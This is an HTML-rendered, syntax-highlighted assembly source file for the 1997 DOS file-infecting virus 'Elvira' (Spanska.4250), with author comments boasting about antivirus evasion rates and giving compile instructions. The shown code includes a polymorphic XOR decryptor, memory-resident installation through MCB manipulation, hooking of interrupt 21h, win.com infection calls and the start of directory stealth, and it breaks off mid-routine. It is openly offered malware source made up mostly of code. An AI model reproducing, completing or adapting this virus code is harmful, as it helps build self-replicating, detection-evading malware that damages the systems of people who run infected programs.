<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Virus.DOS.Spanska_II.4250 - elvira.asm.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
.sc13 {
	color: #808080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;                   ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;                   ³      ELVIRA virus by Spanska     ³</span><span class="sc0">
</span><span class="sc1">;                   ³ Called Spanska.4250 by AV people ³</span><span class="sc0">
</span><span class="sc1">;                   ³      This is my fourth virus     ³</span><span class="sc0">
</span><span class="sc1">;                   ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; *********************************************************************</span><span class="sc0">
</span><span class="sc1">;      This virus is dedicated to a girl with black hairs and</span><span class="sc0">
</span><span class="sc1">;      green eyes, a so lovely vampyre haunting Paris nights.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;      - Greets to my friend VicodinES, Roadkill and all 29A guys</span><span class="sc0">
</span><span class="sc1">;      (next time, don't fuck the cyberbar computers with your</span><span class="sc0">
</span><span class="sc1">;      viruses! The day after, i couldn't send a mail to my girl.</span><span class="sc0">
</span><span class="sc1">;      And for the next meeting, i will try to get up for the</span><span class="sc0">
</span><span class="sc1">;      night rendez-vous in the Gran Via McDonald :)</span><span class="sc0">
</span><span class="sc1">;      - French virus coders, where are you? I feel alone...</span><span class="sc0">
</span><span class="sc1">; ******************************contact me at el_gato@rocketmail.com***</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; At the time it was released (September 97), the heuristic </span><span class="sc0">
</span><span class="sc1">; detection on 100 infected bait files was:</span><span class="sc0">
</span><span class="sc1">;       - TBSCAN 7.07           0/100</span><span class="sc0">
</span><span class="sc1">;       - TBSCANW 7.06          5/100</span><span class="sc0">
</span><span class="sc1">;       - FPROT 2.26            2/100</span><span class="sc0">
</span><span class="sc1">;       - AVP 3.0 (1.08)        0/100</span><span class="sc0">
</span><span class="sc1">;       - FINDVIRUS 7.69        0/100</span><span class="sc0">
</span><span class="sc1">;       - DRWEB                20/100</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; generation zero size: 4297 bytes</span><span class="sc0">
</span><span class="sc1">; virus size:           4250 bytes </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; compile it with TASM /m2 and TLINK /t</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       Properties:</span><span class="sc0">
</span><span class="sc1">; TSR/runtime COM/EXE semi-stealth polymorphic</span><span class="sc0">
</span><span class="sc1">; Signature: "k" and seconds = 30</span><span class="sc0">
</span><span class="sc1">; No infection of some AV or command.com</span><span class="sc0">
</span><span class="sc1">; Disables stealth routine in case of archiver execution</span><span class="sc0">
</span><span class="sc1">; Immediately infects win.com (so it can infect all DOS programs </span><span class="sc0">
</span><span class="sc1">;    under W3.1 or W95).</span><span class="sc0">
</span><span class="sc1">; Graphical payload with 3 messages in french, english and spanish</span><span class="sc0">
</span><span class="sc1">;    (Star-Wars like effect, see extracted routine in elvira-g.com)</span><span class="sc0">
</span><span class="sc1">; Slow poly (just 365 possibilities because i'm an idiot)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; About the poly routine:</span><span class="sc0">
</span><span class="sc1">; As you can see, the poly engine is a very simple routine. Each</span><span class="sc0">
</span><span class="sc1">; instruction on the decryptor is set to a fixed size block (what</span><span class="sc0">
</span><span class="sc1">; i call "mutation" in the source. There are 14 different blocks. </span><span class="sc0">
</span><span class="sc1">; For each of these blocks, i have a stock of something like 10</span><span class="sc0">
</span><span class="sc1">; similar ones that perform the same operation, but with different </span><span class="sc0">
</span><span class="sc1">; manner (see end of virus; for exemple, i have 12 ways to get </span><span class="sc0">
</span><span class="sc1">; the delta offset in 23 bytes). This lame engine has some </span><span class="sc0">
</span><span class="sc1">; advantages. 1/ It's very easy and quick to code. 2/ You can add</span><span class="sc0">
</span><span class="sc1">; very easily new blocks in the stock, for example to make new</span><span class="sc0">
</span><span class="sc1">; undetectable strains. 3/ You can have a great strain variability,</span><span class="sc0">
</span><span class="sc1">; just limited by your imagination (think all the possible manners</span><span class="sc0">
</span><span class="sc1">; to replace a "mov ax, bx" or a "call XX"). Of course, there are </span><span class="sc0">
</span><span class="sc1">; some problems. 1/ Mutation start always at same offset. 2/ You</span><span class="sc0">
</span><span class="sc1">; sometimes have to "fill the holes" in blocks (with nops for </span><span class="sc0">
</span><span class="sc1">; example). 3/ Mutation stocks are big (in this virus, 2000-2500  </span><span class="sc0">
</span><span class="sc1">; bytes).</span><span class="sc0">

</span><span class="sc5">code</span><span class="sc0">    </span><span class="sc9">segment</span><span class="sc0">
    </span><span class="sc9">assume</span><span class="sc0">  </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">code</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc5">code</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">code</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:</span><span class="sc5">code</span><span class="sc0">
    </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0">

</span><span class="sc5">start</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0E9h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2Ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00</span><span class="sc0">                </span><span class="sc1">;jmp start_virus </span><span class="sc0">
</span><span class="sc5">signature</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"k"</span><span class="sc0">                </span><span class="sc1">;signature</span><span class="sc0">

</span><span class="sc1">;******************FAKE HOST***************************</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">message</span><span class="sc0">                               </span><span class="sc1">;*</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">09h</span><span class="sc0">                                          </span><span class="sc1">;*</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                                              </span><span class="sc1">;*</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4c00h</span><span class="sc0">                                     </span><span class="sc1">;*</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                                          </span><span class="sc1">;*</span><span class="sc0">
</span><span class="sc5">message</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"------Fake host execution-----$"</span><span class="sc0">         </span><span class="sc1">;*</span><span class="sc0">
</span><span class="sc1">;******************************************************</span><span class="sc0">

</span><span class="sc5">start_virus</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">mutation0</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0B8h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">38h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">         </span><span class="sc1">;mov ax, offset delta</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0B9h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">         </span><span class="sc1">;mov cx, offset mutation1-delta</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc1">;delta:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
    </span><span class="sc6">clc</span><span class="sc0">

</span><span class="sc5">mutation1</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">14</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">90h</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">mutation2</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0EBh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Eh</span><span class="sc0">                    </span><span class="sc1">;jmp decrypte</span><span class="sc0">
    </span><span class="sc6">nop</span><span class="sc0">
    </span><span class="sc6">nop</span><span class="sc0">
    </span><span class="sc6">nop</span><span class="sc0">

</span><span class="sc5">mutation3</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc5">baise_flag_cryptage</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">nop</span><span class="sc0">
    </span><span class="sc6">nop</span><span class="sc0">
    </span><span class="sc6">nop</span><span class="sc0">
    </span><span class="sc6">nop</span><span class="sc0">
    </span><span class="sc6">nop</span><span class="sc0">

</span><span class="sc5">mutation4</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
    </span><span class="sc6">nop</span><span class="sc0">
    </span><span class="sc6">nop</span><span class="sc0">
    </span><span class="sc6">nop</span><span class="sc0">
    </span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;----------------------decrypting routine-------------------------</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">decrypte</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">mutation5</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">fin_cryptage</span><span class="sc4">-</span><span class="sc5">debut_cryptage</span><span class="sc0">
    </span><span class="sc6">nop</span><span class="sc0">
    </span><span class="sc6">nop</span><span class="sc0">
    </span><span class="sc6">nop</span><span class="sc0">

</span><span class="sc5">mutation6</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">debut_cryptage</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">nop</span><span class="sc0">
    </span><span class="sc6">nop</span><span class="sc0">
    </span><span class="sc6">nop</span><span class="sc0">
    </span><span class="sc6">nop</span><span class="sc0">
    </span><span class="sc6">nop</span><span class="sc0">
    </span><span class="sc6">nop</span><span class="sc0">

</span><span class="sc5">mutation7</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
    </span><span class="sc6">nop</span><span class="sc0">
    </span><span class="sc6">nop</span><span class="sc0">

</span><span class="sc5">mutation8</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">clef</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">nop</span><span class="sc0">
    </span><span class="sc6">nop</span><span class="sc0">
    </span><span class="sc6">nop</span><span class="sc0">
    </span><span class="sc6">nop</span><span class="sc0">
    </span><span class="sc6">nop</span><span class="sc0">

</span><span class="sc5">mutation9</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc5">xor_loop</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lodsb</span><span class="sc0">
    </span><span class="sc6">nop</span><span class="sc0">
    </span><span class="sc6">nop</span><span class="sc0">
    </span><span class="sc6">nop</span><span class="sc0">
    </span><span class="sc6">nop</span><span class="sc0">
    </span><span class="sc6">nop</span><span class="sc0">

</span><span class="sc5">mutation10</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
    </span><span class="sc6">nop</span><span class="sc0">
    </span><span class="sc6">nop</span><span class="sc0">
    </span><span class="sc6">nop</span><span class="sc0">
    </span><span class="sc6">nop</span><span class="sc0">
    </span><span class="sc6">nop</span><span class="sc0">
    </span><span class="sc6">nop</span><span class="sc0">
    </span><span class="sc6">nop</span><span class="sc0">
    </span><span class="sc6">nop</span><span class="sc0">

</span><span class="sc5">mutation11</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">baise_flag_cryptage</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">90h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">90h</span><span class="sc0">

</span><span class="sc5">mutation12</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">nop</span><span class="sc0">
    </span><span class="sc6">nop</span><span class="sc0">
    </span><span class="sc6">nop</span><span class="sc0">
    </span><span class="sc6">nop</span><span class="sc0">

</span><span class="sc5">mutation13</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">nop</span><span class="sc0">
    </span><span class="sc6">nop</span><span class="sc0">
    </span><span class="sc6">nop</span><span class="sc0">

</span><span class="sc5">mutation14</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">xor_loop</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">90h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">90h</span><span class="sc0">


</span><span class="sc5">debut_cryptage</span><span class="sc4">:</span><span class="sc0">                 </span><span class="sc1">;end of polymorphic decryptor</span><span class="sc0">

</span><span class="sc1">;***************** save original es, ds *******************</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">

</span><span class="sc1">;************* test if virus is already resident ******************</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6969h</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                         </span><span class="sc1">;is my handler here?</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6969h</span><span class="sc0">                   </span><span class="sc1">;if yes, bx = 6969h</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">va_resident</span><span class="sc0">                 </span><span class="sc1">;no =&gt; go resident</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">deja_installe</span><span class="sc0">               </span><span class="sc1">;yes =&gt; stop</span><span class="sc0">

</span><span class="sc1">;********************* go TSR ***************************</span><span class="sc0">

</span><span class="sc5">va_resident</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">4a00h</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">0ffffh</span><span class="sc0">                                   </span><span class="sc1">;is there some free memory?</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                                         </span><span class="sc1">;return bx = memory - max size</span><span class="sc0">
                            
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,((</span><span class="sc5">endvirus</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">+</span><span class="sc2">0fh</span><span class="sc4">)/</span><span class="sc2">10h</span><span class="sc4">)*</span><span class="sc2">2</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">     </span><span class="sc1">;substract what we need</span><span class="sc0">
                        </span><span class="sc1">;now bx=wanted paragraphs</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">4a00h</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                                         </span><span class="sc1">;return es = free block segment </span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">4800h</span><span class="sc0">                                      </span><span class="sc1">;set memory</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,((</span><span class="sc5">endvirus</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">+</span><span class="sc2">0fh</span><span class="sc4">)/</span><span class="sc2">10h</span><span class="sc4">)*</span><span class="sc2">2</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                                         </span><span class="sc1">;return ax = free segment</span><span class="sc0">

</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                                       </span><span class="sc1">;es points on the</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                                          </span><span class="sc1">;new MCB</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">],</span><span class="sc12">'Z'</span><span class="sc0">                         </span><span class="sc1">;mark it as the last one</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">                                       </span><span class="sc1">;owner = dos</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">
                            
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">                                      </span><span class="sc1">;copy virus in memory</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">start_virus</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">endvirus</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc0">
</span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

</span><span class="sc1">;********** install my interruption 21 ************************</span><span class="sc0">

</span><span class="sc5">installe</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">;------ 1) get the old interruption vector</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">3521h</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                                         </span><span class="sc1">;return bx=offset, es=segment</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ip_21</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">start_virus</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">    </span><span class="sc1">;save offset</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">cs_21</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">start_virus</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">    </span><span class="sc1">;save segment</span><span class="sc0">

</span><span class="sc1">;------ 2) put my own vector</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">nouvelle_int_21</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">start_virus</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">2522h</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                               </span><span class="sc1">;avoid flag M</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc1">;------ 3) Am i WIN.COM?</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc2">104h</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;bytes 4 and 5 of WIN.COM de W95</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E1Fh</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">i_am_not_win</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc2">106h</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;bytes 6 and 7 of WIN.COM de W95</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E807h</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">i_am_win</span><span class="sc0">

</span><span class="sc5">i_am_not_win</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">infecte_win</span><span class="sc0">                </span><span class="sc1">;infect win.com</span><span class="sc0">

</span><span class="sc5">i_am_win</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">deja_installe</span><span class="sc0">

</span><span class="sc1">;******************** my interruption 21 *****************************</span><span class="sc0">

</span><span class="sc5">nouvelle_int_21</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">stealth_non</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">         </span><span class="sc1">;archiver: no stealth</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">saute_dir_stealth</span><span class="sc0">

    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">55h</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">44h</span><span class="sc0">                     </span><span class="sc1">;dir?</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">dir_stealth</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">47h</span><span class="sc0">                     </span><span class="sc1">;dir?</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">dir_stealth</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">55h</span><span class="sc0">
</span><span class="sc5">saute_dir_stealth</span><span class="sc4">:</span><span class="sc0">

